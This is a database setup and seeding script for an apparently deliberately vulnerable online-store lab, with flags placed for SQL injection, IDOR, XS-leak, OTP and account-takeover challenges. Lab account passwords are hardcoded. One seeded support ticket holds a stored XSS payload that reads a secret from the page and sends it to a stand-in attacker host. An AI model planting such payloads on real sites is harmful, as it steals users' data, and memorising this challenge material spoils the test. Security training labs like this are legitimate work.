'use strict';

const { Pool } = require('pg');
const crypto = require('crypto');
const config = require('./config');
const { hashPassword } = require('./util');

const pool = new Pool({
  connectionString: config.databaseUrl,
  max: 20,
  idleTimeoutMillis: 30000,
});

async function waitForDatabase() {
  for (let attempt = 0; attempt < 60; attempt += 1) {
    try {
      await pool.query('SELECT 1');
      return;
    } catch (error) {
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }
  }
  throw new Error('database did not become available');
}

async function initializeSchema() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id uuid PRIMARY KEY,
      email text UNIQUE NOT NULL,
      name text NOT NULL,
      password_hash text NOT NULL,
      role text NOT NULL DEFAULT 'user',
      email_verified boolean NOT NULL DEFAULT false,
      phone text,
      wallet numeric(12, 2) NOT NULL DEFAULT 0,
      vault text,
      admin_origin text,
      preferences jsonb NOT NULL DEFAULT '{}'::jsonb,
      avatar_preview text,
      created_at timestamptz NOT NULL DEFAULT now()
    );

    CREATE TABLE IF NOT EXISTS products (
      id serial PRIMARY KEY,
      slug text UNIQUE NOT NULL,
      name text NOT NULL,
      tagline text NOT NULL,
      description text NOT NULL,
      price numeric(12, 2) NOT NULL,
      category text NOT NULL,
      image text NOT NULL,
      specs jsonb NOT NULL DEFAULT '{}'::jsonb,
      featured boolean NOT NULL DEFAULT false,
      stock integer NOT NULL DEFAULT 25
    );

    CREATE TABLE IF NOT EXISTS orders (
      id serial PRIMARY KEY,
      user_id uuid NOT NULL REFERENCES users(id),
      total numeric(12, 2) NOT NULL,
      items jsonb NOT NULL,
      address text,
      status text NOT NULL DEFAULT 'confirmed',
      created_at timestamptz NOT NULL DEFAULT now()
    );

    CREATE TABLE IF NOT EXISTS coupons (
      code text PRIMARY KEY,
      label text NOT NULL,
      bonus numeric(12, 2) NOT NULL DEFAULT 0,
      max_uses integer NOT NULL DEFAULT 1,
      uses integer NOT NULL DEFAULT 0
    );

    CREATE TABLE IF NOT EXISTS reports (
      id serial PRIMARY KEY,
      url text NOT NULL,
      user_id uuid,
      status text NOT NULL DEFAULT 'queued',
      created_at timestamptz NOT NULL DEFAULT now()
    );

    CREATE TABLE IF NOT EXISTS support_tickets (
      id serial PRIMARY KEY,
      user_id uuid,
      email text NOT NULL,
      subject text NOT NULL,
      body text NOT NULL,
      status text NOT NULL DEFAULT 'open',
      created_at timestamptz NOT NULL DEFAULT now()
    );

    CREATE TABLE IF NOT EXISTS reset_tokens (
      token text PRIMARY KEY,
      user_id uuid NOT NULL REFERENCES users(id),
      expires_at timestamptz NOT NULL,
      created_at timestamptz NOT NULL DEFAULT now()
    );

    CREATE TABLE IF NOT EXISTS catalog_notes (
      sku text PRIMARY KEY,
      note text NOT NULL
    );
  `);
}

const products = [
  {
    slug: 'nova-x1',
    name: 'Nova X1',
    tagline: 'The phone that sees around corners.',
    description:
      'Aerospace-grade titanium, a 6.8-inch luminescent display and an on-device neural engine. Nova X1 anticipates what you need before you ask.',
    price: 89999,
    category: 'Mobile',
    image: '/assets/phone.svg',
    specs: { display: '6.8" QHD+ 144Hz', chip: 'Aether A1 Neural', camera: '200MP + 50MP ultra', battery: '5,600 mAh' },
    featured: true,
  },
  {
    slug: 'helix-book-ultra',
    name: 'Helix Book Ultra',
    tagline: 'A studio that folds shut.',
    description:
      'A 14.6-inch tandem OLED canvas with a silent vapor chamber and 28 hours of battery. Built for people who render tomorrow.',
    price: 164999,
    category: 'Computing',
    image: '/assets/laptop.svg',
    specs: { display: '14.6" Tandem OLED', chip: 'Aether M3 Pro', memory: '32GB unified', storage: '2TB NVMe' },
    featured: true,
  },
  {
    slug: 'pulse-buds-pro',
    name: 'Pulse Buds Pro',
    tagline: 'Spatial audio, zero gravity.',
    description:
      'Adaptive acoustic mesh, lossless spatial audio and a case that reads the room. Silence has never sounded this precise.',
    price: 24999,
    category: 'Audio',
    image: '/assets/buds.svg',
    specs: { driver: 'Dual 12mm', anc: 'Adaptive 52dB', battery: '42h with case', codec: 'AetherLink Lossless' },
    featured: true,
  },
  {
    slug: 'orbit-watch-s3',
    name: 'Orbit Watch S3',
    tagline: 'Your orbit, quantified.',
    description:
      'Sapphire crystal, dual-band GNSS and a biometric fusion engine that reads recovery, readiness and rhythm in real time.',
    price: 44999,
    category: 'Wearables',
    image: '/assets/watch.svg',
    specs: { display: '1.9" micro-LED', sensors: 'ECG, SpO2, skin temp', battery: '5 days', build: 'Titanium' },
    featured: true,
  },
  {
    slug: 'lumen-vision-8k',
    name: 'Lumen Vision 8K',
    tagline: 'Wall-sized dimension.',
    description:
      'An 85-inch micro-LED wall with 8,000 nits peak brightness and a 0.1ms response. The room disappears.',
    price: 449999,
    category: 'Vision',
    image: '/assets/tv.svg',
    specs: { panel: '85" micro-LED', brightness: '8,000 nits', refresh: '240Hz', audio: '12.2.4 spatial' },
    featured: false,
  },
  {
    slug: 'flux-speaker',
    name: 'Flux Speaker',
    tagline: 'Room-aware resonance.',
    description:
      'A sculptural speaker with 360-degree room mapping, beamforming drivers and an acoustic fabric woven from recycled ocean fibre.',
    price: 34999,
    category: 'Audio',
    image: '/assets/speaker.svg',
    specs: { output: '320W', drivers: '7 array', room: 'AutoEQ 360', finish: 'Graphite weave' },
    featured: false,
  },
  {
    slug: 'aero-tab-12',
    name: 'Aero Tab 12',
    tagline: 'Paper-thin possibility.',
    description:
      'A 12.4-inch flexible OLED tablet with magnetically levitating keyboard and pressure-sensitive creative surface.',
    price: 79999,
    category: 'Computing',
    image: '/assets/tablet.svg',
    specs: { display: '12.4" flexible OLED', pen: 'AeroPen 8,192 levels', battery: '11,000 mAh', weight: '468g' },
    featured: false,
  },
  {
    slug: 'quantum-cam',
    name: 'Quantum Cam',
    tagline: 'Light, rewritten.',
    description:
      'A pocket cinema camera with a 1-inch quantum sensor, 8K/120 recording and computational optics that never miss the moment.',
    price: 119999,
    category: 'Imaging',
    image: '/assets/camera.svg',
    specs: { sensor: '1" quantum CMOS', video: '8K 120fps', lens: '24-70mm f/1.4', stabilization: '6-axis' },
    featured: false,
  },
  {
    slug: 'nova-fold',
    name: 'Nova Fold',
    tagline: 'A horizon that opens.',
    description:
      'Two panes of flexible glass fold into one uninterrupted canvas. A titanium hinge, an invisible crease and a pocketable theatre for everything you make.',
    price: 129999,
    category: 'Mobile',
    image: '/assets/fold.svg',
    specs: { display: '7.9" foldable LTPO', hinge: 'Zero-seam titanium', camera: '108MP triple', battery: '5,200 mAh' },
    featured: true,
  },
  {
    slug: 'nova-mini',
    name: 'Nova Mini',
    tagline: 'The full spectrum, pocket-sized.',
    description:
      'A 5.9-inch edge-to-edge display inside a body that disappears into your hand. The same neural engine, distilled to its essential form.',
    price: 64999,
    category: 'Mobile',
    image: '/assets/phone-mini.svg',
    specs: { display: '5.9" OLED 120Hz', chip: 'Aether A1 Neural', camera: '64MP dual', weight: '158g' },
    featured: false,
  },
  {
    slug: 'helix-studio',
    name: 'Helix Studio',
    tagline: 'A canvas with a gravitational pull.',
    description:
      'A 32-inch 6K reference display with studio-calibrated colour, a magnetic webcam and a stand machined from a single billet of aluminium.',
    price: 219999,
    category: 'Computing',
    image: '/assets/desktop.svg',
    specs: { display: '32" 6K XDR', colour: '1.2B colours', stand: 'Billet aluminium', ports: 'Thunderbolt 5' },
    featured: true,
  },
  {
    slug: 'helix-dock',
    name: 'Helix Dock',
    tagline: 'The quiet centre of your desk.',
    description:
      'Eleven ports, 140W of power and a machined aluminium shell no larger than a coffee cup. Every cable finds its place, silently.',
    price: 32999,
    category: 'Computing',
    image: '/assets/dock.svg',
    specs: { power: '140W passthrough', ports: '11-port hub', video: 'Dual 6K', finish: 'Space graphite' },
    featured: false,
  },
  {
    slug: 'halo-headphones',
    name: 'Halo Headphones',
    tagline: 'Silence, sculpted.',
    description:
      'Over-ear headphones with a carbon headband, memory-foam leather and adaptive cancellation that maps the room 48,000 times a second.',
    price: 54999,
    category: 'Audio',
    image: '/assets/headphones.svg',
    specs: { driver: '40mm beryllium', anc: 'Adaptive 56dB', battery: '60h', codec: 'AetherLink Hi-Res' },
    featured: true,
  },
  {
    slug: 'orbit-ring',
    name: 'Orbit Ring',
    tagline: 'The smallest orbit you own.',
    description:
      'A ceramic smart ring with a titanium inner coil, seven-day battery and a sensor array that reads sleep, recovery and temperature from a whisper of contact.',
    price: 29999,
    category: 'Wearables',
    image: '/assets/ring.svg',
    specs: { material: 'Zirconia ceramic', sensors: 'HR, SpO2, temp', battery: '7 days', weight: '4g' },
    featured: false,
  },
  {
    slug: 'aether-frame',
    name: 'Aether Frame',
    tagline: 'Reality, with a layer of wonder.',
    description:
      'Featherweight AR glasses with a micro-LED light engine, spatial audio and a film-grade amber tint. Information arrives only when you look for it.',
    price: 84999,
    category: 'Vision',
    image: '/assets/glasses.svg',
    specs: { display: 'Dual micro-LED', field: '52° field of view', audio: 'Spatial open-ear', weight: '68g' },
    featured: true,
  },
  {
    slug: 'quantum-lens',
    name: 'Quantum Lens',
    tagline: 'One lens. Every distance.',
    description:
      'A constant-aperture zoom with eighteen elements, nano anti-reflective coating and a linear focus motor that moves in silence.',
    price: 68999,
    category: 'Imaging',
    image: '/assets/lens.svg',
    specs: { range: '24-70mm f/1.2', elements: '18 in 13 groups', mount: 'Aether Q', weight: '645g' },
    featured: false,
  },
  {
    slug: 'aether-air',
    name: 'Aether Air',
    tagline: 'Breathing, engineered.',
    description:
      'A cylindrical purifier wrapped in woven acoustic mesh. It reads the room, filters the invisible and moves less air than a whisper.',
    price: 39999,
    category: 'Home',
    image: '/assets/air.svg',
    specs: { cadr: '620 m³/h', filter: 'HEPA 13 + carbon', noise: '18dB', coverage: '92 m²' },
    featured: false,
  },
  {
    slug: 'aether-beam',
    name: 'Aether Beam',
    tagline: 'A cinema that fits in a palm.',
    description:
      'A pocket projector with a triple-laser light engine, auto keystone and a woven aluminium body. Any wall becomes the widest screen in the house.',
    price: 89999,
    category: 'Home',
    image: '/assets/projector.svg',
    specs: { light: '2,400 lumens', resolution: '4K UHD', throw: '0.8:1 short throw', focus: 'Instant AI' },
    featured: false,
  },
  {
    slug: 'arc-controller',
    name: 'Arc Controller',
    tagline: 'Play, without the wire.',
    description:
      'A low-latency wireless controller with magnetic hall-effect sticks, adaptive triggers and a shell that feels warm before you pick it up.',
    price: 14999,
    category: 'Play',
    image: '/assets/controller.svg',
    specs: { connection: 'AetherLink 2ms', sticks: 'Hall-effect', battery: '40h', profiles: '4 onboard' },
    featured: false,
  },
  {
    slug: 'aether-deck',
    name: 'Aether Deck',
    tagline: 'Your console, folded into a horizon.',
    description:
      'A handheld with a 7-inch 120Hz OLED, detachable arc controls and a vapour chamber that keeps the frame rate where it belongs.',
    price: 74999,
    category: 'Play',
    image: '/assets/handheld.svg',
    specs: { display: '7" OLED 120Hz', chip: 'Aether G2', storage: '1TB NVMe', battery: '6.5h' },
    featured: false,
  },
];

async function seed() {
  const admin = {
    email: config.botAdminEmail,
    name: 'Operations Admin',
    password: config.botAdminPassword,
    role: 'admin',
    verified: true,
    vault: config.flags.cacheDeception,
  };
  await pool.query(
    `INSERT INTO users (id, email, name, password_hash, role, email_verified, vault, wallet)
     VALUES ($1, $2, $3, $4, $5, $6, $7, 8000)
     ON CONFLICT (email) DO UPDATE SET password_hash = EXCLUDED.password_hash, role = 'admin', email_verified = true`,
    [crypto.randomUUID(), admin.email, admin.name, hashPassword(admin.password), admin.role, admin.verified, admin.vault]
  );

  const seededUsers = [
    {
      email: 'mira.chen@aetherion.store',
      name: 'Mira Chen',
      password: 'Mira!Lab#2026',
      verified: false,
      role: 'user',
      vault: config.flags.prehijack,
      wallet: 4300,
      phone: '+919811004421',
    },
    {
      email: 'arjun.mehta@aetherion.store',
      name: 'Arjun Mehta',
      password: 'Arjun!Lab#2026',
      verified: true,
      role: 'user',
      vault: config.flags.otp,
      wallet: 500,
      phone: '+919900000042',
    },
    {
      email: 'nova@aetherion.store',
      name: 'Nova Demo',
      password: 'Nova!Demo#2026',
      verified: true,
      role: 'user',
      vault: null,
      wallet: 2500,
      phone: '+919900001111',
    },
    {
      email: 'kabir.rao@aetherion.store',
      name: 'Kabir Rao',
      password: 'Kabir!Lab#2026',
      verified: false,
      role: 'user',
      vault: config.flags.emailVerify,
      wallet: 0,
      phone: '+919900000313',
    },
  ];

  for (const user of seededUsers) {
    await pool.query(
      `INSERT INTO users (id, email, name, password_hash, role, email_verified, vault, wallet, phone)
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
       ON CONFLICT (email) DO NOTHING`,
      [
        crypto.randomUUID(),
        user.email,
        user.name,
        hashPassword(user.password),
        user.role,
        user.verified,
        user.vault,
        user.wallet,
        user.phone,
      ]
    );
  }

  for (const product of products) {
    await pool.query(
      `INSERT INTO products (slug, name, tagline, description, price, category, image, specs, featured)
       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
       ON CONFLICT (slug) DO UPDATE SET
         name = EXCLUDED.name,
         tagline = EXCLUDED.tagline,
         description = EXCLUDED.description,
         price = EXCLUDED.price,
         category = EXCLUDED.category,
         image = EXCLUDED.image,
         specs = EXCLUDED.specs,
         featured = EXCLUDED.featured`,
      [
        product.slug,
        product.name,
        product.tagline,
        product.description,
        product.price,
        product.category,
        product.image,
        JSON.stringify(product.specs),
        product.featured,
      ]
    );
  }

  await pool.query(
    `UPDATE products SET stock = 2 WHERE slug = 'flux-speaker' AND stock > 2`
  );
  await pool.query(
    `INSERT INTO catalog_notes (sku, note) VALUES ('lumen-vision-8k', $1)
     ON CONFLICT (sku) DO NOTHING`,
    [config.flags.searchSqli]
  );

  await pool.query(
    `INSERT INTO orders (id, user_id, total, items, address, status)
     SELECT 1001, id, 449999, $2, '12 Aurum Quay, Mumbai 400001', 'delivered'
     FROM users WHERE email = $1
       AND NOT EXISTS (SELECT 1 FROM orders WHERE id = 1001)`,
    [
      admin.email,
      JSON.stringify([
        { slug: 'lumen-vision-8k', name: 'Lumen Vision 8K', price: 449999, qty: 1, note: config.flags.orderIdor },
      ]),
    ]
  );
  await pool.query(
    `INSERT INTO orders (id, user_id, total, items, address, status)
     SELECT 2002, id, 34999, $2, '8 Crescent Row, Bengaluru 560001', 'delivered'
     FROM users WHERE email = $1
       AND NOT EXISTS (SELECT 1 FROM orders WHERE id = 2002)`,
    [
      'nova@aetherion.store',
      JSON.stringify([{ slug: 'flux-speaker', name: 'Flux Speaker', price: 34999, qty: 1 }]),
    ]
  );

  await pool.query(
    `INSERT INTO coupons (code, label, bonus, max_uses, uses)
     VALUES ('NEON-ARC', 'Aetherion Days wallet credit', 5000, 1, 0)
     ON CONFLICT (code) DO NOTHING`
  );
  await pool.query(
    `INSERT INTO coupons (code, label, bonus, max_uses, uses)
     VALUES ($1, 'Executive access code', 0, 1, 0)
     ON CONFLICT (code) DO NOTHING`,
    [config.flags.xsleak]
  );
  await pool.query(
    `INSERT INTO coupons (code, label, bonus, max_uses, uses)
     VALUES ('WELCOME-500', 'Welcome credit', 500, 1, 0)
     ON CONFLICT (code) DO NOTHING`
  );

  await pool.query(
    `INSERT INTO support_tickets (user_id, email, subject, body, status)
     SELECT id, email, $2, $3, 'resolved'
     FROM users
     WHERE email = $1
       AND NOT EXISTS (SELECT 1 FROM support_tickets WHERE subject = $2)`,
    [
      'arjun.mehta@aetherion.store',
      'Aether ID code not arriving on new handset',
      'Member reports four-digit Aether ID codes are delayed on +91 99000 00042 after moving to a new handset. Carrier route investigation opened; identity team monitoring delivery.',
    ]
  );

  const xssPayload = `<img src=x onerror="const v=document.querySelector('[data-vault]').dataset.vault;new Image().src='http://attack.aetherion.local:8081/c?d='+encodeURIComponent(v)">`;
  await pool.query(
    `INSERT INTO support_tickets (id, user_id, email, subject, body, status)
     SELECT 5001, id, $2, $3, $4, 'open'
     FROM users WHERE email = $1
       AND NOT EXISTS (SELECT 1 FROM support_tickets WHERE id = 5001)`,
    [
      admin.email,
      'ops@aetherion.store',
      'Priority settlement review',
      `Internal review only. Ledger reference note: ${config.flags.supportIdor}`,
    ]
  );
  await pool.query(
    `INSERT INTO support_tickets (id, user_id, email, subject, body, status)
     SELECT 5002, id, $2, $3, $4, 'open'
     FROM users WHERE email = $1
       AND NOT EXISTS (SELECT 1 FROM support_tickets WHERE id = 5002)`,
    [
      admin.email,
      'ops@aetherion.store',
      'Rendering issue in operations queue',
      xssPayload,
    ]
  );
}

async function bootstrap() {
  await waitForDatabase();
  await initializeSchema();
  await seed();
  return pool;
}

module.exports = { pool, bootstrap };
